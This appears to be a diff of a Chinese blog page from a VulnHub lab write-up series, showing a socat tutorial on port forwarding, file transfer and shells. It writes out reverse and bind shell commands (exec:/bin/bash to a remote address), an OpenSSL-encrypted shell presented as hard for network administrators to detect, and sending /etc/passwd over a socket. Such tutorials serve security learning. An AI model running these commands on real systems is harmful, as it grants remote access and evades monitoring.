 <p><code>socat - - </code>  把标准输入和标准输出对接，输入什么显示什么<br>
 就会对接标准输入和标准输出，类似无参数的 cat 命令</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1292.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1292.png" width="420" alt="Image">
 <p>网络测试 两台主机到底网络能否联通：<br>
  <code>socat - TCP-LISTEN:8080</code>  终端 1 上启动 server 监听 TCP<br>
  <code>socat - TCP:localhost:8080</code>  终端 2 上启动 client 链接 TCP</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1293.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1293.png" width="380" alt="Image">
 <p>服务端在 TCP-LISTEN 地址后面加了 fork 的参数后，就能同时应答多个链接过来的客户端，每个客户端会 fork 一个进程出来进行通信，加上 reuseaddr 可以防止链接没断开玩无法监听的问题。<br>
  <code>socat - TCP-LISTEN:8080,fork,reuseaddr</code>  # 终端 1 上启动 server<br>
  <code>socat - TCP:localhost:8080</code>  # 终端 2 上启动 client</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1294.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1294.png" width="510" alt="Image">
 <p>socat 也可以用 UDP 进行通信<br>
  <code>socat - UDP-LISTEN:8080</code>  # 终端 1 上启动 server 监听 UDP<br>
  <code>socat - UDP:localhost:8080</code>  # 终端 2 上启动 client 链接 UDP</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1295.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1295.png" width="380" alt="Image">
 <h3 id="socat-端口转发"><a class="markdownIt-Anchor" href="#socat-端口转发">#</a> socat 端口转发</h3>
 <p>在主机上监听 8080 端口，将 8080 端口所有流量转发给远程机器的 80 端口，同时在远程机器上开启一个 web 界面：</p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1296.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1296.png" width="620" alt="Image">
 <p>使用以下命令，访问 127.0.0.1 的流量都转发到了 1.117.52.219 的 8080 上了<br>
  <code>socat TCP-LISTEN:8080,fork,reuseaddr TCP:1.117.52.219:80</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1297.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1297.png" width="620" alt="Image">
 <p>socat 加上 fork 以后，每次 accept 一个链接都会 fork 出一份来不影响接收其他的新连接，这样 socat 就可以当一个端口转发服务，一直启动在那里。</p>
 <p>本地转发，在 80 端口起一个 python 的 http.server 服务<br>
 将 80 端口的服务转发至本地的 8888 端口<br>
  <code>socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1:80</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1298.png" alt><br>
-<img data-src="/N1h1l157/VULNHUB/image-1299.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1298.png" width="460" alt="Image">
+<img data-src="/N1h1l157/VULNHUB/image-1299.png" width="350" alt="Image">
 <p>日志信息输出<br>
  <code>socat -d -d tcp-listen:1234 -</code> <br>
  <code>socat -d -d tcp-connect:127.0.0.1:1234 -</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1594.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1594.png" width="700" alt="Image">
 <p>前面两个连续的 -d -d 代表调试信息的输出级别。</p>
 <h3 id="socat-文件传输"><a class="markdownIt-Anchor" href="#socat-文件传输">#</a> socat 文件传输</h3>
 <p>采用 FILE 协议将文件传输到另一台机器</p>
 <p><code>socat -d -d tcp-listen:1234 OPEN:filetransfer.txt,create</code> <br>
  <code>sudo socat -d -d tcp-connect:127.0.0.1:1234 FILE:/etc/passwd</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1300.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1300.png" width="700" alt="Image">
 <h3 id="socat-规避防火墙"><a class="markdownIt-Anchor" href="#socat-规避防火墙">#</a> socat 规避防火墙</h3>
 <blockquote>
 <p>socat 的强大之一在于支持 openssl、可以用于 openssl 连接，这样获取到的反弹 shell 将对网络管理员造成很大的排查难度</p>
 </blockquote>
 <p>创建一个将用于加密连接的证书，我们可以为此使用自签名证书<br>
  <code>openssl req -newkey rsa: 2048 - nodes -keyout cert.key -x509 -days 1000 - out cert.crt</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1301.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1301.png" width="700" alt="Image">
 <p>这将会产生两个文件，cert.crt 和 cert.key，需要组合为 pem 文件<br>
  <code>cat cert.key cert.crt &gt; sslkey.pem</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1302.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1302.png" width="450" alt="Image">
 <blockquote>
 <p>现在我们就得到了一个可以用来连接 socat 加密的证书<br>
 当我们使用加密证书的时候，就不再用 tcp 监听链接，而是用的 openssl 监听，<br>
@@ -394,20 +394,24 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
  <code>socat -d -d openssl-listen:1234,cert=sslkey.pem,verify=0 -</code> <br>
  <code>socat -d -d openssl-connect:127.0.0.1: 1234 ,verify=0 exec:/bin/bash</code></p>
 </blockquote>
-<p><img data-src="/N1h1l157/VULNHUB/image-1303.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1303.png" width="700" alt="Image">
 <p>这是一个无法或者很难被网络管理员监控的加密链接，这使得网络管理员更难分析我们的数据</p>
 <h3 id="socat-远程登录"><a class="markdownIt-Anchor" href="#socat-远程登录">#</a> socat 远程登录</h3>
 <p>一个重要的地址类型就是 EXEC 可以执行程序并且把输入输出和另外一个地址串起来，比如服务端：<br>
  <code>socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash</code> <br>
  <code>socat -d -d - TCP:localhost:8080</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1595.png" alt></p>
+<img data-src="/N1h1l157/VULNHUB/image-1595.png" width="660" alt="Image">
+<blockquote>
 <p>完善一点可以加些参数：(正)<br>
- <code>socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash,pty,stderr</code> <br>
- <code>socat -d -d file:</code> tty <code>,raw,echo=0 TCP:localhost:8080</code></p>
-<p><img data-src="/N1h1l157/VULNHUB/image-1304.png" alt></p>
+socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash,pty,stderr<br>
+socat -d -d file: <code>tty</code> ,raw,echo=0 TCP:localhost:8080</p>
+</blockquote>
+<img data-src="/N1h1l157/VULNHUB/image-1304.png" width="620" alt="Image">
+<blockquote>
 <p>也可以用如下的参数：（反）<br>
- <code>socat -d -d exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:192.168.0.149:8080</code> <br>
- <code>socat -d -d file:</code> tty <code>,raw,echo=0 TCP-LISTEN:8080</code></p>
+socat -d -d exec:‘bash -li’,pty,stderr,setsid,sigint,sane TCP:192.168.0.149:8080<br>
+socat -d -d file: <code>tty</code> ,raw,echo=0 TCP-LISTEN:8080</p>
+</blockquote>
 <blockquote>
 <p>这样可以把 bash 的标准错误重定向给标准输出，并且用终端模式运行。客户端可以像刚才那样登录，但是还可以更高级点，用 tty 的方式访问，这样基本就得到了一个全功能的交互式终端了，可以在里面运行 vim, emacs 之类的程序。</p>
 </blockquote>
@@ -425,7 +429,7 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-06 20:35:55" itemprop="dateModified" datetime="2023-07-06T20:35:55+08:00">2023-07-06</time>
+    <time title="修改时间：2023-07-07 13:10:34" itemprop="dateModified" datetime="2023-07-07T13:10:34+08:00">2023-07-07</time>
   </span>
   <span id="2021/11/01/VULNHUB/143 ORASI/" class="item leancloud_visitors" data-flag-title="VULNHUB 43 ORASI" title="阅读次数">
       <span class="icon">
@@ -488,7 +492,7 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
     <div class="item left">
       
 
-  <a href="/2021/11/01/VULNHUB/146%20NEMESIS/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;kaZNxKDQWGfuhze.jpg" title="VULNHUB 46 NEMESIS">
+  <a href="/2021/11/01/VULNHUB/146%20NEMESIS/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;HBF3Xx8TkufEAiz.jpg" title="VULNHUB 46 NEMESIS">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
   <h3>VULNHUB 46 NEMESIS</h3>
@@ -498,7 +502,7 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
     <div class="item right">
       
 
-  <a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;LwdGZVHeWR3Kv6z.jpg" title="VULNHUB 42 DARKHOLE2">
+  <a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;NE8OanW5ut73GYv.jpg" title="VULNHUB 42 DARKHOLE2">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
   <h3>VULNHUB 42 DARKHOLE2</h3>
@@ -524,7 +528,7 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li class="active"><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li>
+          <li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB 24 HACKABLELL">VULNHUB 24 HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB 25 SNAKEOIL">VULNHUB 25 SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB 26 HACKERKID">VULNHUB 26 HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB 27 TYPO">VULNHUB 27 TYPO</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB 29 PRESIDENTIAL">VULNHUB 29 PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB 30 MOMENTUM2">VULNHUB 30 MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB 31 PROXIMACENTAURI">VULNHUB 31 PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB 28 BLUEMOON">VULNHUB 28 BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB 33 GROTESQUE3">VULNHUB 33 GROTESQUE3</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB 34 GROTESQUE2">VULNHUB 34 GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB 32 JETTY">VULNHUB 32 JETTY</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 37 VENUS">VULNHUB 37 VENUS</a></li><li><a href="/2021/11/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB 35 HACKABLE3">VULNHUB 35 HACKABLE3</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB 36 GROTESQUE1">VULNHUB 36 GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB 39 INFERNO">VULNHUB 39 INFERNO</a></li><li><a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB 38 BLUESOMKE">VULNHUB 38 BLUESOMKE</a></li><li><a href="/2021/11/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB 41 CENGBOX3">VULNHUB 41 CENGBOX3</a></li><li><a href="/2021/11/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB 42 DARKHOLE2">VULNHUB 42 DARKHOLE2</a></li><li class="active"><a href="/2021/11/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB 43 ORASI">VULNHUB 43 ORASI</a></li><li><a href="/2021/11/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB 46 NEMESIS">VULNHUB 46 NEMESIS</a></li><li><a href="/2021/11/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB 45 TORANDO">VULNHUB 45 TORANDO</a></li><li><a href="/2021/11/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB 40 LOOZ">VULNHUB 40 LOOZ</a></li><li><a href="/2021/11/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB 47 WARZONE3">VULNHUB 47 WARZONE3</a></li><li><a href="/2021/11/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB 48 GITROOT">VULNHUB 48 GITROOT</a></li><li><a href="/2021/11/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB 44 CEREAL">VULNHUB 44 CEREAL</a></li><li><a href="/2021/11/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB 50 POWERGRID">VULNHUB 50 POWERGRID</a></li><li><a href="/2021/11/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB 49 DURIAN">VULNHUB 49 DURIAN</a></li>
         </ul>
       </div>
       <div class="overview panel" data-title="站点概览">
@@ -660,30 +664,60 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/46%E3%80%8A%E4%B8%AD%E5%9B%BD%E5%93%B2%E5%AD%A6%E7%AE%80%E5%8F%B2%E3%80%8B%E5%86%AF%E5%8F%8B%E5%85%B0/" title="《中国哲学简史》冯友兰">《中国哲学简史》冯友兰</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
+</div>
+
+    <span><a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="XD22 12 权限维持">XD22 12 权限维持</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/49%E3%80%8A%E6%B2%89%E9%BB%98%E7%9A%84%E7%BE%94%E7%BE%8A%E3%80%8B%E5%86%AF%E7%8E%9B%E5%A3%AB%C2%B7%E5%93%88%E9%87%8C%E6%96%AF/" title="《沉默的羔羊》冯玛士·哈里斯">《沉默的羔羊》冯玛士·哈里斯</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/25%E3%80%8A%E5%8D%81%E6%97%A5%E8%B0%88%E3%80%8B%E8%96%84%E4%BC%BD%E4%B8%98/" title="《十日谈》薄伽丘">《十日谈》薄伽丘</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
-    <span><a href="/2021/11/01/VULNHUB/107%20RECON/" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></span>
+    <span><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+<a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="分类于 信息安全">信息安全</a>
 </div>
 
-    <span><a href="/2020/04/01/MBTI/ISTJ%E8%A7%A3%E8%AF%BB/" title="ISTJ解读">ISTJ解读</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
-</div>
-
-    <span><a href="/2019/07/01/BOOK/9%E3%80%8A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0%E3%80%8B%E4%BD%99%E5%8D%8E/" title="《许三观卖血记》余华">《许三观卖血记》余华</a></span>
+    <span><a href="/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="XD22 9 权限提升">XD22 9 权限提升</a></span>
   </li>
 
       
@@ -693,7 +727,17 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
 <a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
 </div>
 
-    <span><a href="/2019/07/01/BOOK/18%E3%80%8A%E5%A4%A9%E6%96%B9%E5%A4%9C%E8%B0%AD%E3%80%8B%E7%BA%B3%E8%AE%AD/" title="《天方夜谭》纳训">《天方夜谭》纳训</a></span>
+    <span><a href="/2019/07/01/BOOK/12%E3%80%8A%E4%B8%89%E4%BD%93%E3%80%8B%E5%88%98%E6%85%88%E6%AC%A3/" title="《三体》刘慈欣">《三体》刘慈欣</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2019/07/01/BOOK/43%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/" title="《我是猫》夏目漱石">《我是猫》夏目漱石</a></span>
   </li>
 
       
@@ -703,57 +747,17 @@ python3 -c 是在命令行执行 python 代码，上述命令表示用 python 3 
 <a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
 </div>
 
